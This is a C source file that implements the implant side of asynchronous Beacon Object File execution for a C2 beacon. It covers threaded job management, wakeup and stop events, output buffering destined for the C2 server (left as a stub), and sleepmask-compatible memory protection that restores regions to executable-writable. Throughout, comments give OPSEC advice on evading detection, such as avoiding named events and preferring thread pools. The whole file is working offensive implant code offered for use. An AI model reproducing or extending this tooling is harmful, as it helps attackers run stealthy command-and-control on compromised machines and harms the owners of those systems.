/**
 * @file async_bof_implant.c
 * @brief Implementation of Async BOF Implant-Side Core Functions
 * @author Offensive Security Researcher
 * @date 2025
 *
 * This file implements the core mechanisms for asynchronous BOF execution,
 * focusing on thread-safe communication between async BOFs and the main beacon.
 */

#include "async_bof_implant.h"
#include <stdio.h>
#include <string.h>

// ============================================================================
// GLOBAL STATE
// ============================================================================

ASYNC_BOF_MANAGER g_AsyncBOFManager = {0};

// ============================================================================
// UTILITY FUNCTIONS
// ============================================================================

/**
 * @brief Get the current thread's job ID from thread-local storage
 * @return Job ID or 0 if not found
 */
static DWORD GetCurrentJobId(void)
{
    // In a real implementation, this would use thread-local storage
    // to retrieve the job ID associated with the current thread.
    // For now, we'll search the job list by thread ID.

    DWORD dwCurrentThreadId = GetCurrentThreadId();

    EnterCriticalSection(&g_AsyncBOFManager.csJobList);

    for (DWORD i = 0; i < MAX_ASYNC_JOBS; i++) {
        if (g_AsyncBOFManager.Jobs[i].dwThreadId == dwCurrentThreadId &&
            g_AsyncBOFManager.Jobs[i].State == BOF_JOB_RUNNING) {

            DWORD dwJobId = g_AsyncBOFManager.Jobs[i].dwJobId;
            LeaveCriticalSection(&g_AsyncBOFManager.csJobList);
            return dwJobId;
        }
    }

    LeaveCriticalSection(&g_AsyncBOFManager.csJobList);
    return 0;
}

// ============================================================================
// CORE API: BEACONWAKEUP IMPLEMENTATION
// ============================================================================

/**
 * @brief Initialize the wakeup event system
 *
 * Creates a manual-reset event that will be used to wake the beacon
 * from sleep when an async BOF has important data to report.
 */
BOOL AsyncBOF_InitializeWakeupEvent(void)
{
    // Validate that the event handle is NULL (not already initialized)
    if (g_AsyncBOFManager.hGlobalWakeup != NULL) {
        ASYNC_BOF_DEBUG("InitializeWakeupEvent: Already initialized");
        return TRUE; // Already initialized
    }

    // Create a manual-reset event, initially non-signaled
    g_AsyncBOFManager.hGlobalWakeup = CreateEventA(
        NULL,               // Default security
        TRUE,               // Manual reset (beacon resets it manually)
        FALSE,              // Initially non-signaled
        WAKEUP_EVENT_NAME   // Named event (could be anonymous for OPSEC)
    );

    if (g_AsyncBOFManager.hGlobalWakeup == NULL) {
        DWORD dwError = GetLastError();
        ASYNC_BOF_DEBUG("InitializeWakeupEvent: CreateEventA failed (%d)", dwError);
        return FALSE;
    }

    g_AsyncBOFManager.bBeaconSleeping = FALSE;
    return TRUE;
}

/**
 * @brief Wake up the sleeping beacon from async thread
 *
 * This is called by async BOFs when they have important data to report.
 * It signals the global wakeup event, which causes the beacon's main thread
 * to wake from its sleep and process pending output.
 *
 * Thread Safety: Safe to call from multiple threads simultaneously.
 *               The event API is atomic and requires no locking.
 *
 * OPSEC Considerations:
 * - Using named events makes us detectable. Consider using anonymous events
 *   or alternative signaling mechanisms in production.
 * - The beacon should immediately reset the event after waking to avoid
 *   spinning in a tight loop.
 */
BOOL AsyncBOF_BeaconWakeup(void)
{
    if (g_AsyncBOFManager.hGlobalWakeup == NULL) {
        return FALSE;
    }

    // Check if beacon is actually sleeping (optimization)
    // If not sleeping, we don't need to wake it
    if (!g_AsyncBOFManager.bBeaconSleeping) {
        // Beacon is awake, output will be processed normally
        return TRUE;
    }

    // Signal the event to wake up the beacon
    // This causes WaitForSingleObject in beacon's main loop to return
    if (!SetEvent(g_AsyncBOFManager.hGlobalWakeup)) {
        return FALSE;
    }

    ASYNC_BOF_DEBUG("BeaconWakeup: Signal sent to wake beacon");
    return TRUE;
}

/**
 * @brief Wait for wakeup event in beacon main loop
 *
 * This replaces the standard Sleep() call in beacon's command loop.
 * It allows the beacon to sleep but be woken up immediately when an
 * async BOF has important data.
 *
 * @param dwTimeout Timeout in milliseconds (beacon's sleep time)
 * @return WAIT_OBJECT_0 if woken by async BOF, WAIT_TIMEOUT if sleep completed
 *
 * Usage Example in Beacon:
 *   DWORD dwSleepTime = 60000; // 60 seconds
 *   DWORD dwResult = AsyncBOF_WaitForWakeup(dwSleepTime);
 *
 *   if (dwResult == WAIT_OBJECT_0) {
 *       // Woken up by async BOF
 *       AsyncBOF_ProcessAllOutput();
 *   }
 */
DWORD AsyncBOF_WaitForWakeup(DWORD dwTimeout)
{
    if (g_AsyncBOFManager.hGlobalWakeup == NULL) {
        // Fallback to normal sleep if not initialized
        Sleep(dwTimeout);
        return WAIT_TIMEOUT;
    }

    // Mark beacon as sleeping (allows async threads to optimize)
    g_AsyncBOFManager.bBeaconSleeping = TRUE;

    // Wait for either:
    // 1. Wakeup event (async BOF has data)
    // 2. Timeout (normal sleep period elapsed)
    DWORD dwResult = WaitForSingleObject(g_AsyncBOFManager.hGlobalWakeup, dwTimeout);

    // Mark beacon as awake again
    g_AsyncBOFManager.bBeaconSleeping = FALSE;

    // Reset the event so we can wait for it again
    if (dwResult == WAIT_OBJECT_0) {
        ResetEvent(g_AsyncBOFManager.hGlobalWakeup);
        ASYNC_BOF_DEBUG("BeaconWakeup: Woke up due to async BOF signal");
    }

    return dwResult;
}

// ============================================================================
// CORE API: BEACONGETSTOPEVENT IMPLEMENTATION
// ============================================================================

/**
 * @brief Get the stop event handle for a specific job
 *
 * This implements BeaconGetStopJobEvent() semantics.
 * BOF code can wait on this handle to detect when the beacon
 * requests a graceful shutdown.
 *
 * Usage in BOF:
 *   HANDLE hStop = BeaconGetStopJobEvent();
 *   while (WaitForSingleObject(hStop, 1000) != WAIT_OBJECT_0) {
 *       // Do work, checking stop signal every second
 *       DoMonitoringTask();
 *   }
 *   // Clean up and exit
 */
HANDLE AsyncBOF_GetStopJobEvent(DWORD dwJobId)
{
    if (dwJobId == 0) {
        dwJobId = GetCurrentJobId();
    }

    EnterCriticalSection(&g_AsyncBOFManager.csJobList);

    for (DWORD i = 0; i < MAX_ASYNC_JOBS; i++) {
        if (g_AsyncBOFManager.Jobs[i].dwJobId == dwJobId) {
            HANDLE hStopEvent = g_AsyncBOFManager.Jobs[i].hStopEvent;
            LeaveCriticalSection(&g_AsyncBOFManager.csJobList);
            return hStopEvent;
        }
    }

    LeaveCriticalSection(&g_AsyncBOFManager.csJobList);
    return NULL;
}

/**
 * @brief Signal a specific job to stop
 */
static BOOL SignalJobToStop(PASYNC_BOF_JOB pJob)
{
    if (pJob->hStopEvent == NULL) {
        return FALSE;
    }

    // Set the stop event
    if (!SetEvent(pJob->hStopEvent)) {
        return FALSE;
    }

    // Update job state
    pJob->State = BOF_JOB_STOPPING;
    ASYNC_BOF_DEBUG("Job %d: Stop signal sent", pJob->dwJobId);

    return TRUE;
}

/**
 * @brief Signal all async BOFs to stop gracefully
 *
 * Called by beacon during shutdown or when instructed by operator.
 * Never uses TerminateThread - we wait for graceful shutdown.
 */
DWORD AsyncBOF_StopAllJobs(void)
{
    DWORD dwSignaled = 0;

    EnterCriticalSection(&g_AsyncBOFManager.csJobList);

    for (DWORD i = 0; i < MAX_ASYNC_JOBS; i++) {
        if (g_AsyncBOFManager.Jobs[i].State == BOF_JOB_RUNNING) {
            if (SignalJobToStop(&g_AsyncBOFManager.Jobs[i])) {
                dwSignaled++;
            }
        }
    }

    LeaveCriticalSection(&g_AsyncBOFManager.csJobList);

    ASYNC_BOF_DEBUG("StopAllJobs: Signaled %d jobs to stop", dwSignaled);
    return dwSignaled;
}

/**
 * @brief Wait for a specific job to complete
 *
 * Waits for the job thread to finish execution.
 * Should be called after signaling the job to stop.
 */
BOOL AsyncBOF_WaitForJobCompletion(DWORD dwJobId, DWORD dwTimeout)
{
    HANDLE hJobThread = NULL;
    PASYNC_BOF_JOB pJob = NULL;

    EnterCriticalSection(&g_AsyncBOFManager.csJobList);

    for (DWORD i = 0; i < MAX_ASYNC_JOBS; i++) {
        if (g_AsyncBOFManager.Jobs[i].dwJobId == dwJobId) {
            pJob = &g_AsyncBOFManager.Jobs[i];
            hJobThread = pJob->hThread;
            break;
        }
    }

    LeaveCriticalSection(&g_AsyncBOFManager.csJobList);

    if (hJobThread == NULL) {
        return FALSE;
    }

    // Wait for thread to finish
    DWORD dwWaitResult = WaitForSingleObject(hJobThread, dwTimeout);

    if (dwWaitResult == WAIT_OBJECT_0) {
        // Thread completed, clean up
        if (pJob != NULL) {
            CloseHandle(pJob->hThread);
            CloseHandle(pJob->hStopEvent);
            pJob->hThread = NULL;
            pJob->hStopEvent = NULL;
            pJob->State = BOF_JOB_COMPLETED;
        }
        return TRUE;
    }

    // Timeout or error
    return FALSE;
}

// ============================================================================
// JOB MANAGEMENT IMPLEMENTATION
// ============================================================================

/**
 * @brief Initialize the async BOF manager
 *
 * Must be called once during beacon startup.
 * Initializes critical sections, events, and job tracking structures.
 */
BOOL AsyncBOF_InitializeManager(void)
{
    // Initialize critical section for job list
    // Note: InitializeCriticalSection can raise exceptions on low memory
    // In production, you should use InitializeCriticalSectionAndSpinCount
    InitializeCriticalSection(&g_AsyncBOFManager.csJobList);

    // Initialize wakeup event
    if (!AsyncBOF_InitializeWakeupEvent()) {
        DeleteCriticalSection(&g_AsyncBOFManager.csJobList);
        return FALSE;
    }

    // Initialize job array
    ZeroMemory(g_AsyncBOFManager.Jobs, sizeof(g_AsyncBOFManager.Jobs));
    g_AsyncBOFManager.dwNextJobId = 1;
    g_AsyncBOFManager.dwProtectedRegionCount = 0;

    // Initialize function table
    AsyncBOF_InitializeFunctionTable(&g_AsyncBOFManager.FunctionTable);

    return TRUE;
}

/**
 * @brief Cleanup and destroy the async BOF manager
 *
 * Called during beacon shutdown.
 * Ensures all jobs are stopped and resources freed.
 */
BOOL AsyncBOF_DestroyManager(void)
{
    // Stop all running jobs
    DWORD dwStopped = AsyncBOF_StopAllJobs();

    // Wait for all jobs to complete gracefully (with timeout)
    EnterCriticalSection(&g_AsyncBOFManager.csJobList);

    for (DWORD i = 0; i < MAX_ASYNC_JOBS; i++) {
        // Clean up job resources
        if (g_AsyncBOFManager.Jobs[i].pOutputBuffer != NULL) {
            LocalFree(g_AsyncBOFManager.Jobs[i].pOutputBuffer);
            g_AsyncBOFManager.Jobs[i].pOutputBuffer = NULL;
            DeleteCriticalSection(&g_AsyncBOFManager.Jobs[i].csOutput);
        }

        // Close handles if still open
        if (g_AsyncBOFManager.Jobs[i].hStopEvent != NULL) {
            CloseHandle(g_AsyncBOFManager.Jobs[i].hStopEvent);
            g_AsyncBOFManager.Jobs[i].hStopEvent = NULL;
        }

        if (g_AsyncBOFManager.Jobs[i].hThread != NULL) {
            CloseHandle(g_AsyncBOFManager.Jobs[i].hThread);
            g_AsyncBOFManager.Jobs[i].hThread = NULL;
        }

        if (g_AsyncBOFManager.Jobs[i].hWakeupEvent != NULL) {
            CloseHandle(g_AsyncBOFManager.Jobs[i].hWakeupEvent);
            g_AsyncBOFManager.Jobs[i].hWakeupEvent = NULL;
        }

        g_AsyncBOFManager.Jobs[i].State = BOF_JOB_IDLE;
    }

    LeaveCriticalSection(&g_AsyncBOFManager.csJobList);

    // Close global wakeup event
    if (g_AsyncBOFManager.hGlobalWakeup != NULL) {
        CloseHandle(g_AsyncBOFManager.hGlobalWakeup);
        g_AsyncBOFManager.hGlobalWakeup = NULL;
    }

    // Delete critical section
    DeleteCriticalSection(&g_AsyncBOFManager.csJobList);

    ASYNC_BOF_DEBUG("AsyncBOF Manager destroyed (stopped %d jobs)", dwStopped);
    return TRUE;
}

/**
 * @brief Find an empty job slot
 */
static DWORD FindEmptyJobSlot(void)
{
    for (DWORD i = 0; i < MAX_ASYNC_JOBS; i++) {
        if (g_AsyncBOFManager.Jobs[i].State == BOF_JOB_IDLE ||
            g_AsyncBOFManager.Jobs[i].State == BOF_JOB_COMPLETED) {

            return i;
        }
    }
    return MAX_ASYNC_JOBS; // No empty slot
}

/**
 * @brief Start a new async BOF job
 *
 * This is the main function called by beacon to launch an async BOF.
 * It creates a worker thread and sets up the execution environment.
 */
BOOL AsyncBOF_StartJob(
    LPVOID pBOFEntry,
    LPVOID pArgs,
    SIZE_T nArgsSize,
    SIZE_T nCodeSize,
    PDWORD pdwJobId)
{
    if (pBOFEntry == NULL || pdwJobId == NULL) {
        ASYNC_BOF_DEBUG("StartJob: Invalid parameters (pBOFEntry=%p, pdwJobId=%p)",
                       pBOFEntry, pdwJobId);
        return FALSE;
    }

    // Find an empty job slot
    DWORD dwSlot = FindEmptyJobSlot();
    if (dwSlot >= MAX_ASYNC_JOBS) {
        ASYNC_BOF_DEBUG("StartJob: No available job slots");
        return FALSE;
    }

    PASYNC_BOF_JOB pJob = &g_AsyncBOFManager.Jobs[dwSlot];

    // Initialize job structure
    ZeroMemory(pJob, sizeof(ASYNC_BOF_JOB));
    pJob->pBOFCode = pBOFEntry;
    pJob->nCodeSize = nCodeSize;
    pJob->pBOFData = pArgs;
    pJob->nDataSize = nArgsSize;

    // Create stop event (manual reset, initially non-signaled)
    pJob->hStopEvent = CreateEventA(NULL, TRUE, FALSE, NULL);
    if (pJob->hStopEvent == NULL) {
        DWORD dwError = GetLastError();
        ASYNC_BOF_DEBUG("StartJob: CreateEventA failed (%d)", dwError);
        return FALSE;
    }

    // Initialize output buffer critical section
    InitializeCriticalSection(&pJob->csOutput);
    // Note: For production, use InitializeCriticalSectionAndSpinCount for better performance

    // Allocate output buffer
    pJob->nOutputCapacity = MAX_OUTPUT_BUFFER_SIZE;
    pJob->pOutputBuffer = (LPBYTE)LocalAlloc(LPTR, pJob->nOutputCapacity);
    if (pJob->pOutputBuffer == NULL) {
        DWORD dwError = GetLastError();
        ASYNC_BOF_DEBUG("StartJob: LocalAlloc failed (%d)", dwError);
        DeleteCriticalSection(&pJob->csOutput);
        CloseHandle(pJob->hStopEvent);
        return FALSE;
    }

    // Assign job ID
    EnterCriticalSection(&g_AsyncBOFManager.csJobList);
    pJob->dwJobId = g_AsyncBOFManager.dwNextJobId++;
    pJob->State = BOF_JOB_RUNNING;
    pJob->dwStartTime = GetTickCount();
    pJob->dwLastHeartbeat = pJob->dwStartTime;
    LeaveCriticalSection(&g_AsyncBOFManager.csJobList);

    // Create worker thread
    // Note: Consider using thread pool for better OPSEC in production
    pJob->hThread = CreateThread(
        NULL,                   // Default security
        0,                      // Default stack size
        AsyncBOF_WorkerThread,  // Thread procedure
        pJob,                   // Thread parameter
        0,                      // Run immediately
        &pJob->dwThreadId       // Receives thread ID
    );

    if (pJob->hThread == NULL) {
        DWORD dwError = GetLastError();
        ASYNC_BOF_DEBUG("StartJob: CreateThread failed (%d)", dwError);

        // Cleanup on failure
        DeleteCriticalSection(&pJob->csOutput);
        LocalFree(pJob->pOutputBuffer);
        CloseHandle(pJob->hStopEvent);
        pJob->State = BOF_JOB_IDLE;

        return FALSE;
    }

    *pdwJobId = pJob->dwJobId;
    ASYNC_BOF_DEBUG("Job %d: Started (Thread ID: %d)", pJob->dwJobId, pJob->dwThreadId);

    return TRUE;
}

/**
 * @brief Stop and cleanup a specific job
 */
BOOL AsyncBOF_StopJob(DWORD dwJobId, BOOL bForce)
{
    PASYNC_BOF_JOB pJob = NULL;

    EnterCriticalSection(&g_AsyncBOFManager.csJobList);

    // Find the job
    for (DWORD i = 0; i < MAX_ASYNC_JOBS; i++) {
        if (g_AsyncBOFManager.Jobs[i].dwJobId == dwJobId) {
            pJob = &g_AsyncBOFManager.Jobs[i];
            break;
        }
    }

    if (pJob == NULL || pJob->State != BOF_JOB_RUNNING) {
        LeaveCriticalSection(&g_AsyncBOFManager.csJobList);
        return FALSE;
    }

    LeaveCriticalSection(&g_AsyncBOFManager.csJobList);

    // Signal the job to stop
    if (!SignalJobToStop(pJob)) {
        return FALSE;
    }

    // Wait for graceful shutdown (with timeout)
    if (AsyncBOF_WaitForJobCompletion(dwJobId, 5000)) {
        ASYNC_BOF_DEBUG("Job %d: Stopped gracefully", dwJobId);
        return TRUE;
    }

    // Last resort: force terminate (NOT RECOMMENDED)
    if (bForce && pJob->hThread != NULL) {
        ASYNC_BOF_DEBUG("Job %d: WARNING - Force terminating thread", dwJobId);
        TerminateThread(pJob->hThread, 1);
        CloseHandle(pJob->hThread);
        pJob->hThread = NULL;
        pJob->State = BOF_JOB_FAILED;
        return TRUE;
    }

    return FALSE;
}

// ============================================================================
// WORKER THREAD IMPLEMENTATION
// ============================================================================

/**
 * @brief Worker thread procedure for async BOF execution
 *
 * This is the entry point for all async BOF threads.
 * It sets up the environment, calls the BOF, and handles cleanup.
 */
DWORD WINAPI AsyncBOF_WorkerThread(LPVOID pContext)
{
    PASYNC_BOF_JOB pJob = (PASYNC_BOF_JOB)pContext;
    DWORD dwResult = 0;

    if (pJob == NULL || pJob->pBOFCode == NULL) {
        return 1;
    }

    ASYNC_BOF_DEBUG("Job %d: Worker thread started", pJob->dwJobId);

    // Typedef for BOF entry point
    typedef void (*BOF_ENTRY_POINT)(void*, int);
    BOF_ENTRY_POINT pBOFMain = (BOF_ENTRY_POINT)pJob->pBOFCode;

    // Call the BOF entry point
    // BOF signature: void bof_main datap* parser, int argc
    // Note: In production, you should add proper exception handling here
    pBOFMain(pJob->pBOFData, 0);

    ASYNC_BOF_DEBUG("Job %d: BOF completed successfully", pJob->dwJobId);

    // Mark job as having pending output
    EnterCriticalSection(&g_AsyncBOFManager.csJobList);
    if (pJob->State == BOF_JOB_RUNNING) {
        pJob->State = BOF_JOB_PENDING_OUTPUT;
    }
    LeaveCriticalSection(&g_AsyncBOFManager.csJobList);

    // Wake up beacon to process output
    AsyncBOF_BeaconWakeup();

    ASYNC_BOF_DEBUG("Job %d: Worker thread exiting (code: %d)", pJob->dwJobId, dwResult);
    return dwResult;
}

// ============================================================================
// PROXY FUNCTIONS (ASYNC-SAFE BEACON API)
// ============================================================================

/**
 * @brief Async-safe version of BeaconPrintf
 *
 * Queues output to job's buffer instead of calling main beacon directly.
 * This prevents crashes when main beacon memory is encrypted.
 */
void AsyncBOF_ProxyBeaconPrintf(int type, const char* fmt, ...)
{
    DWORD dwJobId = GetCurrentJobId();
    if (dwJobId == 0) {
        return; // Not called from a job thread
    }

    // Find the job and keep lock to prevent race condition
    PASYNC_BOF_JOB pJob = NULL;
    EnterCriticalSection(&g_AsyncBOFManager.csJobList);

    for (DWORD i = 0; i < MAX_ASYNC_JOBS; i++) {
        if (g_AsyncBOFManager.Jobs[i].dwJobId == dwJobId) {
            pJob = &g_AsyncBOFManager.Jobs[i];
            break;
        }
    }

    if (pJob == NULL) {
        LeaveCriticalSection(&g_AsyncBOFManager.csJobList);
        return;
    }

    // NOTE: We keep csJobList locked while using pJob pointer to prevent
    // the job from being deleted while we're accessing it

    // Format the message
    char szBuffer[4096];
    va_list args;
    va_start(args, fmt);
    vsnprintf_s(szBuffer, sizeof(szBuffer), _TRUNCATE, fmt, args);
    va_end(args);

    size_t nLen = strlen(szBuffer);
    if (nLen == 0) {
        LeaveCriticalSection(&g_AsyncBOFManager.csJobList);
        return;
    }

    // Add to output buffer - lock the job's output buffer
    EnterCriticalSection(&pJob->csOutput);

    // Check if we have space
    if (pJob->nOutputSize + nLen + 16 < pJob->nOutputCapacity) {
        // Store output type prefix (4 bytes)
        *(DWORD*)&pJob->pOutputBuffer[pJob->nOutputSize] = (DWORD)type;
        pJob->nOutputSize += sizeof(DWORD);

        // Store string length (4 bytes)
        *(DWORD*)&pJob->pOutputBuffer[pJob->nOutputSize] = (DWORD)nLen;
        pJob->nOutputSize += sizeof(DWORD);

        // Store string data
        CopyMemory(&pJob->pOutputBuffer[pJob->nOutputSize], szBuffer, nLen);
        pJob->nOutputSize += (DWORD)nLen;

        // Update heartbeat
        pJob->dwLastHeartbeat = GetTickCount();
    }

    LeaveCriticalSection(&pJob->csOutput);
    LeaveCriticalSection(&g_AsyncBOFManager.csJobList);
}

/**
 * @brief Async-safe version of BeaconOutput
 */
void AsyncBOF_ProxyBeaconOutput(int type, const void* data, size_t len)
{
    if (data == NULL || len == 0) {
        return;
    }

    DWORD dwJobId = GetCurrentJobId();
    if (dwJobId == 0) {
        return;
    }

    // Find the job and keep lock to prevent race condition
    PASYNC_BOF_JOB pJob = NULL;
    EnterCriticalSection(&g_AsyncBOFManager.csJobList);

    for (DWORD i = 0; i < MAX_ASYNC_JOBS; i++) {
        if (g_AsyncBOFManager.Jobs[i].dwJobId == dwJobId) {
            pJob = &g_AsyncBOFManager.Jobs[i];
            break;
        }
    }

    if (pJob == NULL) {
        LeaveCriticalSection(&g_AsyncBOFManager.csJobList);
        return;
    }

    // Keep csJobList locked while accessing pJob

    // Add to output buffer
    EnterCriticalSection(&pJob->csOutput);

    if (pJob->nOutputSize + len + 16 < pJob->nOutputCapacity) {
        // Store output type
        *(DWORD*)&pJob->pOutputBuffer[pJob->nOutputSize] = (DWORD)type;
        pJob->nOutputSize += sizeof(DWORD);

        // Store data length
        *(DWORD*)&pJob->pOutputBuffer[pJob->nOutputSize] = (DWORD)len;
        pJob->nOutputSize += sizeof(DWORD);

        // Store data
        CopyMemory(&pJob->pOutputBuffer[pJob->nOutputSize], data, len);
        pJob->nOutputSize += (DWORD)len;

        pJob->dwLastHeartbeat = GetTickCount();
    }

    LeaveCriticalSection(&pJob->csOutput);
    LeaveCriticalSection(&g_AsyncBOFManager.csJobList);
}

/**
 * @brief Async-safe memory allocator
 */
void* AsyncBOF_ProxyBeaconAlloc(size_t size)
{
    // Use LocalAlloc instead of Beacon API
    // In production, this should use a custom allocator for better OPSEC
    return LocalAlloc(LPTR, size);
}

/**
 * @brief Async-safe memory deallocator
 */
void AsyncBOF_ProxyBeaconFree(void* ptr)
{
    if (ptr != NULL) {
        LocalFree(ptr);
    }
}

// ============================================================================
// OUTPUT PROCESSING
// ============================================================================

/**
 * @brief Check if any job has pending output
 */
BOOL AsyncBOF_HasPendingOutput(void)
{
    EnterCriticalSection(&g_AsyncBOFManager.csJobList);

    for (DWORD i = 0; i < MAX_ASYNC_JOBS; i++) {
        if (g_AsyncBOFManager.Jobs[i].State == BOF_JOB_PENDING_OUTPUT) {
            LeaveCriticalSection(&g_AsyncBOFManager.csJobList);
            return TRUE;
        }
    }

    LeaveCriticalSection(&g_AsyncBOFManager.csJobList);
    return FALSE;
}

/**
 * @brief Process and send all pending output to C2
 *
 * Called by beacon when it wakes up (either normally or via BeaconWakeup).
 * Iterates through all jobs with pending output and sends to C2.
 */
DWORD AsyncBOF_ProcessAllOutput(void)
{
    DWORD dwProcessed = 0;

    EnterCriticalSection(&g_AsyncBOFManager.csJobList);

    for (DWORD i = 0; i < MAX_ASYNC_JOBS; i++) {
        if (g_AsyncBOFManager.Jobs[i].State != BOF_JOB_PENDING_OUTPUT) {
            continue;
        }

        PASYNC_BOF_JOB pJob = &g_AsyncBOFManager.Jobs[i];

        if (pJob->nOutputSize == 0) {
            pJob->State = BOF_JOB_COMPLETED;
            continue;
        }

        // Get output data
        LPVOID pOutput = NULL;
        SIZE_T nSize = pJob->nOutputSize;

        // We need to copy the output while holding the lock
        pOutput = LocalAlloc(LPTR, nSize);
        if (pOutput != NULL) {
            EnterCriticalSection(&pJob->csOutput);
            CopyMemory(pOutput, pJob->pOutputBuffer, nSize);

            // Reset output buffer
            ZeroMemory(pJob->pOutputBuffer, pJob->nOutputCapacity);
            pJob->nOutputSize = 0;

            LeaveCriticalSection(&pJob->csOutput);

            // TODO: Send to C2 via real Beacon API
            // For now, we just simulate it
            // BeaconOutput(COB_OUTPUT_TYPE, pOutput, nSize);

            LocalFree(pOutput);
            dwProcessed++;

            ASYNC_BOF_DEBUG("Job %d: Sent %zu bytes to C2", pJob->dwJobId, nSize);
        }

        // Update job state
        if (pJob->State == BOF_JOB_PENDING_OUTPUT) {
            pJob->State = BOF_JOB_RUNNING; // Still running, or
            // BOF_JOB_COMPLETED if thread finished
        }
    }

    LeaveCriticalSection(&g_AsyncBOFManager.csJobList);

    if (dwProcessed > 0) {
        ASYNC_BOF_DEBUG("ProcessAllOutput: Processed %d jobs", dwProcessed);
    }

    return dwProcessed;
}

// ============================================================================
// FUNCTION TABLE INITIALIZATION
// ============================================================================

/**
 * @brief Initialize the async function table with real implementations
 */
void AsyncBOF_InitializeFunctionTable(ASYNC_BOF_FUNCTION_TABLE* pTable)
{
    if (pTable == NULL) {
        return;
    }

    pTable->AsyncBeaconPrintf = AsyncBOF_ProxyBeaconPrintf;
    pTable->AsyncBeaconOutput = AsyncBOF_ProxyBeaconOutput;
    pTable->AsyncBeaconAlloc = AsyncBOF_ProxyBeaconAlloc;
    pTable->AsyncBeaconFree = AsyncBOF_ProxyBeaconFree;
    pTable->AsyncBeaconWakeup = (BOOL (*)(void))AsyncBOF_BeaconWakeup;
    pTable->AsyncBeaconGetStopJobEvent = (HANDLE (*)(void))AsyncBOF_GetStopJobEvent;

    // TODO: Add parsing function pointers
    pTable->AsyncBeaconGetValue = NULL;
    pTable->AsyncBeaconGetParsedData = NULL;
}

// ============================================================================
// MEMORY PROTECTION (SLEEPMASK COMPATIBILITY)
// ============================================================================

/**
 * @brief Protect async BOF memory regions before Sleepmask activates
 */
BOOL AsyncBOF_ProtectMemoryForSleep(void)
{
    ASYNC_BOF_DEBUG("ProtectMemoryForSleep: Protecting %d regions",
                    g_AsyncBOFManager.dwProtectedRegionCount);

    for (DWORD i = 0; i < g_AsyncBOFManager.dwProtectedRegionCount; i++) {
        LPVOID pAddress = g_AsyncBOFManager.pProtectedRegions[i];
        if (pAddress == NULL) {
            continue;
        }

        // Get region size (simplified - in production, use VirtualQuery)
        MEMORY_BASIC_INFORMATION mbi;
        if (VirtualQuery(pAddress, &mbi, sizeof(mbi)) == 0) {
            continue;
        }

        DWORD dwOldProtect;
        if (!VirtualProtect(
            pAddress,
            mbi.RegionSize,
            PAGE_READONLY,
            &dwOldProtect
        )) {
            continue;
        }

        ASYNC_BOF_DEBUG("Protected region at %p (size: %zu)",
                        pAddress, mbi.RegionSize);
    }

    // Flush instruction cache to ensure changes take effect
    FlushInstructionCache(GetCurrentProcess(), NULL, 0);

    return TRUE;
}

/**
 * @brief Restore async BOF memory protections after Sleepmask deactivates
 */
BOOL AsyncBOF_RestoreMemoryAfterSleep(void)
{
    ASYNC_BOF_DEBUG("RestoreMemoryAfterSleep: Restoring protections");

    for (DWORD i = 0; i < g_AsyncBOFManager.dwProtectedRegionCount; i++) {
        LPVOID pAddress = g_AsyncBOFManager.pProtectedRegions[i];
        if (pAddress == NULL) {
            continue;
        }

        MEMORY_BASIC_INFORMATION mbi;
        if (VirtualQuery(pAddress, &mbi, sizeof(mbi)) == 0) {
            continue;
        }

        DWORD dwOldProtect;
        VirtualProtect(pAddress, mbi.RegionSize, PAGE_EXECUTE_READWRITE, &dwOldProtect);
    }

    FlushInstructionCache(GetCurrentProcess(), NULL, 0);
    return TRUE;
}

/**
 * @brief Add a memory region to the protection list
 */
BOOL AsyncBOF_AddProtectedRegion(LPVOID pAddress, SIZE_T nSize)
{
    if (g_AsyncBOFManager.dwProtectedRegionCount >= MAX_ASYNC_JOBS) {
        return FALSE;
    }

    g_AsyncBOFManager.pProtectedRegions[g_AsyncBOFManager.dwProtectedRegionCount++] = pAddress;
    return TRUE;
}
